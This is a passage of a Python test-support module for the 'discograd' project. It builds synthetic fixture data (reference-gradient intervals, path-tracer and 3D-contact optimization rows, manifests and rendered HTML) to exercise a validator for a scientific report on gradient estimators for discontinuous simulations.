from __future__ import annotations

import base64
import copy
import contextlib
import dataclasses
import hashlib
import io
import json
import math
import subprocess
import sys
import tempfile
import unittest
from fractions import Fraction
from html.parser import HTMLParser
from pathlib import Path
from unittest import mock
from urllib.parse import quote, unquote

import discograd.validate_report as validate_report_module
from discograd.validate_report import (
    EXPECTED_REFERENCE_CELLS,
    REFERENCE_POLICY,
    REFERENCE_TRUNCATION_POLICY,
    REQUIRED_METHOD_IDS,
    REQUIRED_SECTION_IDS,
    ValidationError,
    validate_publication,
)


RAW_NAMES = (
    "analytic.json",
    "triangle_2d.json",
    "collision_2d.json",
    "path_tracer_gradients.json",
    "path_tracer_optimization.json",
    "contact_3d_gradients.json",
    "contact_3d_optimization.json",
    "opaque_mesh.json",
    "performance.json",
    "references.json",
)
PLOT_NAMES = (
    "analytic_gates.json",
    "gradient_quality.json",
    "bias_variance.json",
    "optimization.json",
    "validity.json",
    "performance.json",
)
FIGURE_NAMES = (
    "analytic_gates.png",
    "triangle_edge_slices.png",
    "collision_2d.png",
    "path_tracer_recovery.png",
    "path_tracer_gradient_quality.png",
    "contact_3d_trajectories.png",
    "contact_3d_gradient_quality.png",
    "opaque_mesh_boundary.png",
    "bias_variance.png",
    "optimization.png",
    "performance.png",
)
IMAGE_NAMES = ("path_target.png", "path_initial.png", "path_recovered.png")
REQUIRED_LITERATURE_URLS = (
    "https://arxiv.org/abs/2109.05143",
    "https://arxiv.org/abs/2310.03585",
    "https://github.com/DiscoGrad/DiscoGrad",
    "https://github.com/a-paulus/softtorch",
    "https://arxiv.org/abs/2603.08824",
)
REPORT_TEMPLATE = Path(__file__).resolve().parents[1] / "report_template.html"
BUILD_SCRIPT = REPORT_TEMPLATE.with_name("build_report.py")
PNG_BYTES = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
)

SCHEMA_VERSION = 2
REPORT_PROTOCOL_FINGERPRINT = (
    "49cc87ceb090bd7d8b0b9a3e023b618bb6cc12875109b50dfe3f374ccde918a1"
)
PROTOCOL_DISCLOSURE_PARAGRAPH_START = (
    "<p>Reference cells use paired batched five-point stencils"
)
FIVE_POINT_STENCIL_FORWARD_EVALUATIONS_PER_DIMENSION = 4
REAL_V2_REPORT_REFERENCE_COUNT_RATIONALE = (
    "Accepted after a clean CPU protocol-v2 pilot projected 27,954.723406340072 seconds "
    "for the report workload; the nominal reference counts are retained without reduction."
)
REAL_V2_REPORT_REFERENCE_COUNT_DECISION = {
    "status": "accepted",
    "pilot_tier": "pilot",
    "pilot_manifest_sha256": "8312eb08a106446f6b689c71cb2c7a6140f708755bcd075ebd45fb48fc9f6d2e",
    "pilot_source_commit": "28889267a0a8495d88c3ef668eee9c53dda6492c",
    "pilot_projected_report_seconds": 27954.723406340072,
    "decided_at_utc": "2026-06-28T20:15:09Z",
    "protocol_fingerprint": REPORT_PROTOCOL_FINGERPRINT,
    "path_reference_samples": 32768,
    "contact_reference_samples": 65536,
    "reference_seed_sets": 4,
    "rationale": REAL_V2_REPORT_REFERENCE_COUNT_RATIONALE,
}

REPORT_CONFIG = {
    "width": 24,
    "height": 16,
    "spp": 2,
    "bounces": 3,
    "smoothing_samples": [8, 16, 32, 64, 128],
    "estimator_seeds": 32,
    "optimization_steps": 64,
    "optimization_schedules": 16,
    "path_reference_samples": 32768,
    "contact_reference_samples": 65536,
    "reference_seed_sets": 4,
}
PATH_CERTIFICATE_FINGERPRINT = (
    "8f4814d92d301575e1d79caa80ddb6dcdf3a89cce666950000b5d24aa3129676"
)
PATH_GAUGE_TARGET = "gaussian_smoothed_hard_with_numerical_gauge_assumption"
PATH_GAUGE_TARGET_LABEL = (
    "certified residual control variate for the Gaussian-smoothed box-clipped hard render; "
    "exact Duff and safety-gauge selected-arm derivatives hold almost everywhere"
)
PATH_ONB_SEAM_SEMANTICS = (
    "z >= 0 uses the positive Duff chart; z < 0 uses the negative Duff chart; "
    "this numerical gauge branch is not smoothed"
)
PATH_OPTIMIZATION_METHODS = (
    "crisp_ad",
    "soft_ad",
    "straight_through_ad",
    "residual_control_variate",
)
PATH_ROOT_CALLABLE_KEYS = (
    "kernel:image_loss_384_kernel(image:array(ndim=1, dtype=vec3d),"
    "target:array(ndim=1, dtype=vec3d),loss:array(ndim=1, dtype=float64))",
    "kernel:path_trace_soft_3_kernel(params:array(ndim=1, dtype=float64),"
    "random_values:array(ndim=1, dtype=float64),base_directions:array(ndim=1, dtype=vec3d),"
    "centers:array(ndim=1, dtype=vec3d),radii:array(ndim=1, dtype=float64),"
    "movable:array(ndim=1, dtype=float64),albedos:array(ndim=1, dtype=vec3d),"
    "emissions:array(ndim=1, dtype=vec3d),mirrors:array(ndim=1, dtype=float64),"
    "terminals:array(ndim=1, dtype=float64),material_ids:array(ndim=1, dtype=float64),"
    "width:int32,height:int32,samples_per_pixel:int32,random_stride:int32,gate_width:float64,"
    "radiance:array(ndim=1, dtype=vec3d),direct:array(ndim=1, dtype=vec3d),"
    "indirect:array(ndim=1, dtype=vec3d),depths:array(ndim=1, dtype=float64),"
    "sequences:array(ndim=1, dtype=float64))",
    "kernel:reduce_paths_2_kernel(path_radiance:array(ndim=1, dtype=vec3d),"
    "path_direct:array(ndim=1, dtype=vec3d),path_indirect:array(ndim=1, dtype=vec3d),"
    "image:array(ndim=1, dtype=vec3d),direct_image:array(ndim=1, dtype=vec3d),"
    "indirect_image:array(ndim=1, dtype=vec3d))",
)
PATH_CALLABLE_KEYS = (
    "function:_clip_path_parameters(params:vec3d,return:vec3d)",
    "function:_clip_scalar_exact(value:float64,lower:float64,upper:float64,return:float64)",
    "function:_cosine_hemisphere_from_basis(normal:vec3d,tangent:vec3d,bitangent:vec3d,"
    "random_u1:float64,random_u2:float64,return:vec3d)",
    "function:_duff_chart_sign(normal_z:float64,return:float64)",
    "function:_duff_frisvad_basis(normal:vec3d)",
    "function:_event_scalar_soft(exact_measure:float64,smooth_margin:float64,current:float64,"
    "candidate:float64,gate_width:float64,return:float64)",
    "function:_event_vector_soft(exact_measure:float64,smooth_margin:float64,current:vec3d,"
    "candidate:vec3d,gate_width:float64,return:vec3d)",
    "function:_finish_bounce(origin_alive:vec4d,direction_depth:vec4d,throughput_first:vec4d,"
    "radiance:vec3d,direct_radiance:vec3d,indirect_radiance:vec3d,sequence:float64,"
    "best_distance:float64,hit:float64,hit_normal:vec3d,albedo:vec3d,emission:vec3d,"
    "mirror:float64,terminal:float64,material_id:float64,diffuse_direction:vec3d)",
    "function:_initial_path_state(params:vec3d,base_direction:vec3d)",
    "function:_least_aligned_basis_soft(normal:vec3d,gate_width:float64)",
    "function:_minimum_soft(first:float64,second:float64,gate_width:float64,return:float64)",
    "function:_multiply_vector(first:vec3d,second:vec3d,return:vec3d)",
    "function:_numeric_abs(value:float64,return:float64)",
    "function:_numeric_max(first:float64,second:float64,return:float64)",
    "function:_safe_normalize(value:vec3d,return:vec3d)",
    "function:_sphere_candidate_distance_soft(half_b:float64,square_root:float64,"
    "gate_width:float64,return:float64)",
    "function:_store_path(path_index:int32,radiance_value:vec3d,direct_value:vec3d,"
    "indirect_value:vec3d,depth_value:float64,sequence_value:float64,"
    "radiance:array(ndim=1, dtype=vec3d),direct:array(ndim=1, dtype=vec3d),"
    "indirect:array(ndim=1, dtype=vec3d),depths:array(ndim=1, dtype=float64),"
    "sequences:array(ndim=1, dtype=float64))",
    "function:_total_nonnegative(value:float64,return:float64)",
    "function:_trace_bounce_soft(origin_alive:vec4d,direction_depth:vec4d,"
    "throughput_first:vec4d,radiance:vec3d,direct_radiance:vec3d,indirect_radiance:vec3d,"
    "sequence:float64,params:vec3d,random_u1:float64,random_u2:float64,"
    "centers:array(ndim=1, dtype=vec3d),radii:array(ndim=1, dtype=float64),"
    "movable:array(ndim=1, dtype=float64),albedos:array(ndim=1, dtype=vec3d),"
    "emissions:array(ndim=1, dtype=vec3d),mirrors:array(ndim=1, dtype=float64),"
    "terminals:array(ndim=1, dtype=float64),material_ids:array(ndim=1, dtype=float64),"
    "gate_width:float64)",
    *PATH_ROOT_CALLABLE_KEYS,
)
REPORT_RUNTIME_PHASES = (
    "gradients_analytic",
    "gradients_triangle_2d",
    "gradients_collision_2d",
    "gradients_path_tracer",
    "gradients_contact_3d",
    "gradients_opaque_mesh",
    "references_triangle_2d",
    "references_collision_2d",
    "references_path_tracer",
    "references_contact_3d",
    "references_opaque_mesh",
    "optimization_path_tracer",
    "optimization_contact_3d",
    "performance",
    "serialization",
    "assets",
    "validation",
    "finalization",
    "installation",
    "orchestration",
)


class _RenderedPageParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.cells: list[tuple[dict[str, str], str]] = []
        self.figures: list[dict[str, str]] = []
        self.images: list[tuple[dict[str, str], int | None]] = []
        self.data_narratives: list[dict[str, str]] = []
        self._cell_attributes: dict[str, str] | None = None
        self._cell_text: list[str] = []
        self._figure_stack: list[int] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        attributes = {name: value or "" for name, value in attrs}
        if tag == "td":
            self._cell_attributes = attributes
            self._cell_text = []
        elif tag == "figure":
            self.figures.append(attributes)
            self._figure_stack.append(len(self.figures) - 1)
        elif tag == "img":
            parent = self._figure_stack[-1] if self._figure_stack else None
            self.images.append((attributes, parent))
        elif tag == "p" and "lede" in attributes.get("class", "").split():
            self.data_narratives.append(attributes)

    def handle_data(self, data: str) -> None:
        if self._cell_attributes is not None:
            self._cell_text.append(data)

    def handle_endtag(self, tag: str) -> None:
        if tag == "td" and self._cell_attributes is not None:
            self.cells.append((self._cell_attributes, "".join(self._cell_text).strip()))
            self._cell_attributes = None
            self._cell_text = []
        elif tag == "figure" and self._figure_stack:
            self._figure_stack.pop()


def _resolve_json_pointer(value: object, pointer: str) -> object:
    if pointer.startswith("#"):
        pointer = unquote(pointer[1:])
    if not pointer.startswith("/"):
        raise AssertionError(f"not a JSON pointer: {pointer!r}")
    current = value
    for raw_part in pointer[1:].split("/"):
        part = raw_part.replace("~1", "/").replace("~0", "~")
        if isinstance(current, list):
            current = current[int(part)]
        elif isinstance(current, dict):
            current = current[part]
        else:
            raise AssertionError(f"pointer {pointer!r} traverses a scalar")
    return current


def _displayed_numeric_value(text: str) -> int | float | list[object] | None:
    if text.startswith("[") and text.endswith("]"):
        try:
            value = json.loads(text)
        except json.JSONDecodeError:
            return None
        return (
            value
            if isinstance(value, list)
            and all(
                isinstance(item, (int, float)) and not isinstance(item, bool)
                for item in value
            )
            else None
        )
    try:
        value = float(text)
    except ValueError:
        return None
    return value if math.isfinite(value) else None


def write_fixture_json(path: Path, value: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(value, sort_keys=True, allow_nan=False), encoding="utf-8"
    )


def _replace_protocol_disclosure_paragraph(source: str, replacement: str) -> str:
    start = source.index(PROTOCOL_DISCLOSURE_PARAGRAPH_START)
    end = source.index("</p>", start) + len("</p>")
    result = source[:start] + replacement + source[end:]
    if result == source:
        raise AssertionError(
            "protocol disclosure mutation did not change rendered HTML"
        )
    return result


def _append_before_body(source: str, fragment: str) -> str:
    if "</body>" not in source:
        raise AssertionError("canonical rendered HTML has no closing body tag")
    result = source.replace("</body>", fragment + "</body>", 1)
    if result == source:
        raise AssertionError("HTML append mutation did not change rendered output")
    return result


def _refresh_manifest(root: Path) -> None:
    manifest_path = root / "data/manifest.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    files = {}
    for path in sorted((*root.glob("data/**/*.json"), *root.glob("assets/**/*.png"))):
        if path == manifest_path:
            continue
        relative = path.relative_to(root).as_posix()
        files[relative] = {
            "sha256": hashlib.sha256(path.read_bytes()).hexdigest(),
            "bytes": path.stat().st_size,
        }
    manifest["files"] = files
    write_fixture_json(manifest_path, manifest)


def _refresh_manifest_and_index(root: Path) -> None:
    _refresh_manifest(root)
    from discograd import build_report

    (root / "index.html").write_bytes(
        build_report.render_report(root=root, template_path=REPORT_TEMPLATE)
    )


def _canonical_reference_seed(
    base_seed: int, inner_seed: int, replicate: int, domain: int
) -> int:
    domain_size = (2**31) // 4
    digest = hashlib.sha256(f"{base_seed}:{inner_seed}".encode("ascii")).digest()
    offset = int.from_bytes(digest[:8], "big") % domain_size
    return domain * domain_size + ((offset + replicate) % domain_size)


def _canonical_reference_seed_protocol(
    cell_id: str,
) -> tuple[int, int, dict[str, object] | None]:
    path_table: dict[str, object] = {
        "training": list(range(1000, 1032)),
        "target": list(range(2000, 2016)),
        "held_out": list(range(3000, 3016)),
        "reference_base": 4000,
        "reference_inner_base": 4001,
    }
    contact_table: dict[str, object] = {
        "estimator_outer": list(range(5000, 5032)),
        "optimization_outer": [6000 + 64 * schedule for schedule in range(16)],
        "reference_base": 302,
        "reference_inner_base": 402,
    }
    opaque_table: dict[str, object] = {
        "estimator_outer": list(range(9000, 9032)),
        "reference_base": 10000,
        "reference_inner_base": 11000,
    }
    protocols: dict[str, tuple[int, int, dict[str, object] | None]] = {
        "triangle_2d:edge_midpoints": (101, 111, None),
        "path_tracer:initial_parameters": (4000, 4001, path_table),
        "contact_3d:initial_launch_velocity": (302, 402, contact_table),
        "opaque_mesh:camera_parameters": (10000, 11000, opaque_table),
    }
    base_seed = 201
    for scenario in ("pinball_bank", "crowded_table"):
        for start in range(3):
            protocols[f"collision_2d:{scenario}:start_{start}"] = (
                base_seed,
                base_seed + 100,
                None,
            )
            base_seed += 1
    return protocols[cell_id]


CANONICAL_REFERENCE_INPUTS = {
    "triangle_2d:edge_midpoints": {
        "parameters": [0.0, -0.385],
        "sigma": [0.02, 0.02],
        "h": [0.005, 0.005],
        "h_half": [0.0025, 0.0025],
    },
    "collision_2d:pinball_bank:start_0": {
        "parameters": [1.65, 0.12],
        "sigma": [0.02, 0.02],
        "h": [0.0033, 0.002],
        "h_half": [0.00165, 0.001],
    },
    "collision_2d:pinball_bank:start_1": {
        "parameters": [1.45, 0.42],
        "sigma": [0.02, 0.02],
        "h": [0.0029, 0.002],
        "h_half": [0.00145, 0.001],
    },
    "collision_2d:pinball_bank:start_2": {
        "parameters": [2.0, 0.5],
        "sigma": [0.02, 0.02],
        "h": [0.004, 0.002],
        "h_half": [0.002, 0.001],
    },
    "collision_2d:crowded_table:start_0": {
        "parameters": [1.35, -0.05],
        "sigma": [0.02, 0.02],
        "h": [0.0027, 0.002],
        "h_half": [0.00135, 0.001],
    },
    "collision_2d:crowded_table:start_1": {
        "parameters": [0.8, -0.2],
        "sigma": [0.02, 0.02],
        "h": [0.002, 0.002],
        "h_half": [0.001, 0.001],
    },
    "collision_2d:crowded_table:start_2": {
        "parameters": [2.2, -0.7],
        "sigma": [0.02, 0.02],
        "h": [0.0044, 0.002],
        "h_half": [0.0022, 0.001],
    },
    "path_tracer:initial_parameters": {
        "parameters": [-0.28, 0.16, -0.32],
        "sigma": [0.03, 0.03, 0.03],
        "h": [0.01, 0.01, 0.01],
        "h_half": [0.005, 0.005, 0.005],
    },
    "contact_3d:initial_launch_velocity": {
        "parameters": [2.2, -0.1, 0.65],
        "sigma": [0.02, 0.02, 0.02],
        "h": [0.0044, 0.002, 0.002],
        "h_half": [0.0022, 0.001, 0.001],
    },
    "opaque_mesh:camera_parameters": {
        "parameters": [-0.18, 0.1],
        "sigma": [0.055, 0.055],
        "h": [0.02, 0.02],
        "h_half": [0.01, 0.01],
    },
}


def _reference_interval_record(values: list[list[float]]) -> dict[str, object]:
    replicates = len(values)
    if replicates != REFERENCE_POLICY.replicates:
        raise AssertionError("reference oracle received a noncanonical replicate count")
    dimension = len(values[0])
    means: list[float] = []
    variances: list[float] = []
    mean_variances: list[float] = []
    for component in range(dimension):
        exact_values = [Fraction.from_float(row[component]) for row in values]
        exact_mean = sum(exact_values, Fraction()) / replicates
        exact_variance = sum(
            ((value - exact_mean) ** 2 for value in exact_values), Fraction()
        ) / (replicates - 1)
        means.append(float(exact_mean))
        variances.append(float(exact_variance))
        mean_variances.append(float(exact_variance / replicates))
    raw_half_widths = [
        REFERENCE_POLICY.student_t_critical * math.sqrt(value)
        for value in mean_variances
    ]
    ci_low = [mean - width for mean, width in zip(means, raw_half_widths)]
    ci_high = [mean + width for mean, width in zip(means, raw_half_widths)]
    return {
        "mean": means,
        "variance": variances,
        "mean_variance": mean_variances,
        "half_width": [0.5 * (high - low) for low, high in zip(ci_low, ci_high)],
        "ci_low": ci_low,
        "ci_high": ci_high,
        "replicates": replicates,
        "degrees_of_freedom": replicates - 1,
        "confidence": REFERENCE_POLICY.confidence,
    }


def _populate_reference_evidence(row: dict[str, object]) -> None:
    g_h = row["g_h"]
    g_h2 = row["g_h2"]
    score = row["score"]
    assert isinstance(g_h, list)
    assert isinstance(g_h2, list)
    assert isinstance(score, list)
    paired = [
        [first - second for first, second in zip(h_row, h2_row)]
        for h_row, h2_row in zip(g_h, g_h2)
    ]
    richardson_denominator = (
        REFERENCE_POLICY.refinement_ratio**REFERENCE_POLICY.richardson_order - 1
    )
    fine_error = [
        [
            (first - second) / richardson_denominator
            for first, second in zip(h_row, h2_row)
        ]
        for h_row, h2_row in zip(g_h, g_h2)
    ]
    richardson = [
        [second - error for second, error in zip(h2_row, error_row)]
        for h2_row, error_row in zip(g_h2, fine_error)
    ]
    intervals = {
        "g_h": _reference_interval_record(g_h),
        "g_h2": _reference_interval_record(g_h2),
        "score": _reference_interval_record(score),
        "paired_h_minus_h2": _reference_interval_record(paired),
        "fine_truncation_error": _reference_interval_record(fine_error),
        "richardson": _reference_interval_record(richardson),
    }
    h_interval = intervals["g_h"]
    h2_interval = intervals["g_h2"]
    score_interval = intervals["score"]
    paired_interval = intervals["paired_h_minus_h2"]
    error_interval = intervals["fine_truncation_error"]
    richardson_interval = intervals["richardson"]
    overlap = [
        max(first, third) <= min(second, fourth)
        for first, second, third, fourth in zip(
            richardson_interval["ci_low"],
            richardson_interval["ci_high"],
            score_interval["ci_low"],
            score_interval["ci_high"],
        )
    ]
    marginal = [
        abs(first - second) <= first_width + second_width
        for first, second, first_width, second_width in zip(
            h_interval["mean"],
            h2_interval["mean"],
            h_interval["half_width"],
            h2_interval["half_width"],
        )
    ]
    paired_zero = [
        low <= 0.0 <= high
        for low, high in zip(paired_interval["ci_low"], paired_interval["ci_high"])
    ]
    truncation_upper_bound = [
        max(abs(low), abs(high))
        for low, high in zip(error_interval["ci_low"], error_interval["ci_high"])
    ]
    statistical_budget = [
        REFERENCE_POLICY.statistical_budget_fraction * width
        for width in richardson_interval["half_width"]
    ]
    roundoff_floor = [
        REFERENCE_POLICY.roundoff_floor_ulps
        * sys.float_info.epsilon
        * max(1.0, abs(h_mean), abs(h2_mean), abs(richardson_mean))
        for h_mean, h2_mean, richardson_mean in zip(
            h_interval["mean"],
            h2_interval["mean"],
            richardson_interval["mean"],
        )
    ]
    effective_budget = [
        max(statistical, floor)
        for statistical, floor in zip(statistical_budget, roundoff_floor)
    ]
    floor_dominated = [
        floor > statistical
        for statistical, floor in zip(statistical_budget, roundoff_floor)
    ]
    truncation_components = [
        upper <= effective
        for upper, effective in zip(truncation_upper_bound, effective_budget)
    ]
    overlap_accepted = all(overlap)
    truncation_accepted = all(truncation_components)
    references_accepted = overlap_accepted and truncation_accepted and len(g_h) >= 4
    row.update(
        reference_gradient=list(richardson_interval["mean"]),
        intervals=intervals,
        truncation_policy=dict(REFERENCE_TRUNCATION_POLICY),
        diagnostics={
            "overlap_components": overlap,
            "marginal_step_components": marginal,
            "paired_step_components": paired_zero,
            "truncation_upper_bound": truncation_upper_bound,
            "truncation_statistical_budget": statistical_budget,
            "truncation_roundoff_floor": roundoff_floor,
            "truncation_effective_budget": effective_budget,
            "truncation_floor_dominated": floor_dominated,
            "truncation_components": truncation_components,
        },
        accepted={
            "references": references_accepted,
            "fd_score_overlap": overlap_accepted,
            "step_consistency": truncation_accepted,
            "marginal_step_consistency": all(marginal),
            "paired_step_consistency": all(paired_zero),
            "truncation_error_controlled": truncation_accepted,
            "replicate_count_sufficient": len(g_h) >= 4,
            "smoke_only": False,
        },
        reasons=(
            []
            if references_accepted
            else ["synthetic fixture intentionally fails a publication gate"]
        ),
    )


def _report_runtime_record() -> dict[str, object]:
    phase_seconds = {
        name: 0.1 + 0.01 * index for index, name in enumerate(REPORT_RUNTIME_PHASES)
    }
    elapsed_seconds = sum(phase_seconds.values())
    return {
        "tier": "report",
        "elapsed_seconds": elapsed_seconds,
        "elapsed_measurement": "through_one_complete_descriptor_relative_install_pass",
        "measurement_excludes": [
            "final_install_timing_metadata_rewrite",
            "final_metadata_bearing_reinstall_and_binding_verification",
        ],
        "measured_finalization_pass_seconds": phase_seconds["finalization"],
        "measured_installation_pass_seconds": phase_seconds["installation"],
        "phase_seconds": phase_seconds,
        "projection_factors": dict.fromkeys(REPORT_RUNTIME_PHASES, 1.0),
        "projection_model": "measured_phase_times_scaled_by_exact_report_workload_ratios",
        "projected_report_seconds": elapsed_seconds,
    }


def _path_method_config(inner_seed: int, method: str) -> dict[str, object]:
    return {
        "bounces": 3,
        "epsilon": 0.01 if method in {"crisp_fd", "smoothed_crn_fd"} else None,
        "gate_family": "gaussian",
        "gate_width": 0.05,
        "height": 16,
        "inner_random_digest": hashlib.sha256(
            f"path-inner-seed:{inner_seed}".encode()
        ).hexdigest(),
        "numerical_gauge_policy": "exact_selected_arm_derivative_almost_everywhere",
        "numerical_gauge_sites": 5,
        "onb_seam_semantics": PATH_ONB_SEAM_SEMANTICS,
        "outer_parameter_sigma": 0.03,
        "parameter_extension": "componentwise_box_clip_before_geometry",
        "parameter_lower": [-0.8, -0.5, -0.9],
        "parameter_upper": [0.8, 0.5, 0.3],
        "paths_per_forward": 768,
        "pixels": 384,
        "samples_per_pixel": 2,
        "sphere_tests_per_forward": 11520,
        "target_seed": 2000,
        "width": 24,
        "workload_policy": "fixed_stochastic_sample_count_not_equal_execution",
    }


def _path_protocol_row() -> dict[str, object]:
    return {
        "row_id": "path:randomness-protocol",
        "scenario_family": "path_tracer",
        "scenario": "path_randomness_protocol",
        "accepted": True,
        "source_commit": "1" * 40,
        "device": "cpu",
        "seed_domains": {
            "inner": "camera_and_bsdf_samples",
            "outer": "gaussian_parameter_perturbations",
            "target": "independent_target_render",
        },
        "seed_tables": {
            "training": list(range(1000, 1032)),
            "target": list(range(2000, 2016)),
            "held_out": list(range(3000, 3016)),
            "reference_base": 4000,
            "reference_inner_base": 4001,
        },
        "estimator_outer_seeds": list(range(10000, 10032)),
        "reference_protocol": {
            "inputs": {"reference_base": 4000, "reference_inner_base": 4001},
            "realized_streams_location": "data/raw/references.json:seeds",
        },
        "render_work": {"paths_per_forward": 768, "sphere_tests_per_forward": 11520},
        "certificate": {
            "complete": True,
            "transformed_sites": 7,
            "smoothed_sites": 2,
            "numerical_gauge_sites": 5,
            "fully_smoothed": False,
            "fingerprint": PATH_CERTIFICATE_FINGERPRINT,
            "root_callable_keys": list(PATH_ROOT_CALLABLE_KEYS),
            "callable_keys": list(PATH_CALLABLE_KEYS),
        },
        "control_variate": {
            "unbiased_target": True,
            "target": PATH_GAUGE_TARGET,
            "certificate_fingerprint": PATH_CERTIFICATE_FINGERPRINT,
            "hard_forward_executions": 8,
            "soft_forward_executions": 8,
            "numerical_gauge_assumption": True,
            "numerical_gauge_sites": 5,
        },
    }


def _path_optimization_rows() -> list[dict[str, object]]:
    render_work = {
        "cached_target_renders": 1,
        "shared_initial_candidate_renders": 1,
        "optimization_candidate_renders": 256,
        "deterministic_final_recheck_renders": 4,
        "total_candidate_renders": 261,
        "total_renders": 262,
    }
    rows = []
    for schedule in range(16):
        estimator_seeds = list(range(12000 + 100 * schedule, 12064 + 100 * schedule))
        losses = [1.0 - 0.5 * step / 64 for step in range(65)]
        parameters = [[0.0, 0.0, 0.0] for _ in range(65)]
        gradients = [[0.0, 0.0, 0.0] for _ in range(64)]
        for method in PATH_OPTIMIZATION_METHODS:
            rows.append(
                {
                    "row_id": f"path:optimization:{method}:{schedule}",
                    "scenario_family": "path_tracer",
                    "scenario": "analytic_five_sphere",
                    "method": method,
                    "schedule_id": schedule,
                    "initial_hard_loss": 1.0,
                    "final_hard_loss": 0.5,
                    "held_out_loss": 0.5,
                    "success": True,
                    "accepted": True,
                    "source_commit": "1" * 40,
                    "device": "cpu",
                    "losses": list(losses),
                    "parameters": copy.deepcopy(parameters),
                    "gradients": copy.deepcopy(gradients),
                    "final_parameter_error": 0.5,
                    "estimator_seeds": list(estimator_seeds),
                    "target_seed": 2000 + schedule,
                    "held_out_seed": 3000 + schedule,
                    "deterministic_final_recheck": 0.5,
                    "final_recheck_seed": 3000 + schedule,
                    "final_recheck_protocol": (
                        "same_seed_integrity_check_against_cached_immutable_target"
                    ),
                    "held_out_render_evaluations": 66,
                    "held_out_render_work": dict(render_work),
                    "objective_extension": "componentwise_box_clip_before_geometry",
                    "numerical_gauge_policy": (
                        "exact_selected_arm_derivative_almost_everywhere"
                    ),
                    "box_constraints": {
                        "lower": [-0.8, -0.5, -0.9],
                        "upper": [0.8, 0.5, 0.3],
                    },
                }
            )
    return rows


def _path_optimization_summaries(
    rows: list[dict[str, object]],
) -> list[dict[str, object]]:
    return [
        {
            "scenario": "path_tracer",
            "method": method,
            "final_hard_loss_mean": 0.5,
            "final_hard_loss_ci_low": 0.5,
            "final_hard_loss_ci_high": 0.5,
            "success_rate": 1.0,
            "held_out_loss_mean": 0.5,
            "source_row_ids": [
                row["row_id"] for row in rows if row["method"] == method
            ],
        }
        for method in sorted(PATH_OPTIMIZATION_METHODS)
    ]


def _contact_physical_validity() -> dict[str, object]:
    positive = [[[] for _ in range(4)] for _ in range(180)]
    positive[0][0] = ["pair_01", "floor_0"]
    positive[1][0] = ["pair_12", "ramp_0"]
    return {
        "valid": True,
        "checks": {
            "pair_01_contact": True,
            "pair_12_contact": True,
            "ordered_pair_01_then_pair_12": True,
            "floor_contact": True,
            "ramp_contact": True,
            "stick_mode": True,
            "slide_mode": True,
            "no_zero_limit_slide": True,
            "penetration_bounded": True,
            "contact_energy_bounded": True,
            "pair_momentum_conserved": True,
            "pair_angular_momentum_conserved": True,
            "meaningful_positive_impulse": True,
        },
        "pair_contact_counts": {"0-1": 1, "0-2": 0, "1-2": 1},
        "static_contact_counts": {"floor": 1, "ramp": 1},
        "pair_correction_counts": {"0-1": 1, "0-2": 0, "1-2": 1},
        "static_correction_counts": {"floor": 1, "ramp": 1},
        "positive_impulse_event_types_by_step_and_sweep": positive,
        "correction_event_types_by_step_and_sweep": copy.deepcopy(positive),
        "canonical_solver_event_order": [
            "pair_01",
            "pair_02",
            "pair_12",
            "floor_0",
            "floor_1",
            "floor_2",
            "ramp_0",
            "ramp_1",
            "ramp_2",
        ],
        "event_sequence_semantics": "ordered_per_step_per_sweep_solver_call_events_with_multiplicity",
        "stick_contacts": 1,
        "slide_contacts": 3,
        "zero_limit_slide_contacts": 0,
        "body_steps": 540,
        "contact_sweeps": 720,
        "pair_solver_calls": 2160,
        "static_solver_calls": 4320,
        "minimum_positive_normal_impulse": 1.0e-6,
        "positive_impulse_threshold": 1.0e-8,
        "max_penetration": 0.02,
        "max_contact_energy_gain": 0.01,
        "max_pair_momentum_error": 5.0e-6,
        "max_pair_angular_momentum_error": 5.0e-6,
        "thresholds": {
            "max_penetration": 0.03,
            "max_contact_energy_gain": 0.02,
            "max_pair_momentum_error": 1.0e-5,
            "max_pair_angular_momentum_error": 1.0e-5,
        },
    }


def _contact_gradient_work(method: str, schedule: int) -> list[dict[str, object]]:
    method_work = (
        {
            "samples": 8,
            "forward_executions": 16,
            "backward_executions": 8,
            "independent_contributions": 4,
            "parameter_perturbations": 8,
            "hard_forward_executions": 8,
            "soft_forward_executions": 8,
        }
        if method == "residual_control_variate"
        else {
            "samples": 1,
            "forward_executions": 1,
            "backward_executions": 1,
            "independent_contributions": 1,
            "parameter_perturbations": 1,
            "hard_forward_executions": None,
            "soft_forward_executions": None,
        }
    )
    return [
        {
            "step": step,
            "outer_seed": 6000 + 64 * schedule + step,
            "inner_seed": None,
            **method_work,
        }
        for step in range(64)
    ]


def _contact_optimization_rows() -> list[dict[str, object]]:
    rows = []
    losses = [1.0 - 0.5 * step / 64 for step in range(65)]
    parameters = [[0.0, 0.0, 0.0] for _ in range(65)]
    hard_work = {
        "initial_forward_executions": 1,
        "line_search_batches": 64,
        "line_search_candidates_per_batch": 6,
        "line_search_forward_executions": 384,
        "final_forward_executions": 1,
        "recheck_forward_executions": 1,
        "total_forward_executions": 387,
    }
    for schedule in range(16):
        seeds = list(range(6000 + 64 * schedule, 6000 + 64 * schedule + 64))
        for method in ("soft_ad", "straight_through_ad", "residual_control_variate"):
            rows.append(
                {
                    "row_id": f"contact:optimization:{method}:{schedule}",
                    "scenario_family": "contact_3d",
                    "scenario": "three_sphere_floor_ramp",
                    "method": method,
                    "schedule_id": schedule,
                    "initial_hard_loss": 1.0,
                    "final_hard_loss": 0.5,
                    "held_out_loss": 0.5,
                    "success": True,
                    "accepted": True,
                    "source_commit": "1" * 40,
                    "device": "cpu",
                    "losses": list(losses),
                    "parameters": copy.deepcopy(parameters),
                    "final_target_position_error": 0.5,
                    "final_physical_validity": _contact_physical_validity(),
                    "gradient_work": _contact_gradient_work(method, schedule),
                    "hard_evaluation_work": dict(hard_work),
                    "realized_outer_seeds": seeds,
                }
            )
    return rows


def _contact_optimization_summaries(
    rows: list[dict[str, object]],
) -> list[dict[str, object]]:
    return [
        {
            "scenario": "contact_3d",
            "method": method,
            "final_hard_loss_mean": 0.5,
            "final_hard_loss_ci_low": 0.5,
            "final_hard_loss_ci_high": 0.5,
            "success_rate": 1.0,
